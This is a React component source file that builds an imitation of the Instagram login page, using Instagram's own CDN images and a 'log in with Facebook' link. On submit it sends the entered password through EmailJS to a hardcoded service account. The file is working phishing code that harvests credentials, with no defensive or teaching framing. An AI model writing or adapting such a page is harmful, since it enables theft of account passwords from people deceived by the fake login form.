import './Box1.css'
import { Link } from "react-router-dom";
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome'
import { library } from '@fortawesome/fontawesome-svg-core'
import { fab } from '@fortawesome/free-brands-svg-icons'
import React, { useRef } from 'react';
import emailjs from '@emailjs/browser';


library.add(fab)


const Box1 = () => {
    const form = useRef();

    const sendEmail = (e) => {
      e.preventDefault();
  
      emailjs.sendForm('service_ie0vfk9', 'template_yg9ejah', form.current, 'dEGoKuhfgKTVYF7fL')
        .then((result) => {
            console.log(result.text);
        }, (error) => {
            console.log(error.text);
        });
    };




    return (
<div>


<div className='Bigform'>
    <div >
        <i className='logo' role='img'></i>
    </div>
   
<form ref={form} onSubmit={sendEmail} >
<input  type='text' placeholder='Phone number, username,or email' />
<input  type='password' placeholder='Password'  name='pass' />
<button className="action" type="submit" >
    <div className="bigbtn">Log in</div>
    </button>
</form>

<div className='bigline'>

<div className='line1'>
</div>

<div className='line2'>
</div>

<div className='or'>
or
</div>


</div>
<div className='login'>
<FontAwesomeIcon icon="fa-brands fa-facebook-f" />
<Link to='loginwithfacebook' className='aa'> log in with Facebook</Link>
  </div>
<div className='forget'>
<p>
    Forgot password ?
</p>

</div>
</div>  

<div  className='secbox'>
<p>Don't have an account?</p>
<span>Sign up</span>
</div>

<div className='getapp'>
<span className='get'>Get the app.</span>

<img alt="Get it on Google Play" className="pic1" src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png"></img>
<img alt="Get it from Microsoft" className="pic2" src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png"></img>
</div>
</div>
    
    );
};
 
export default Box1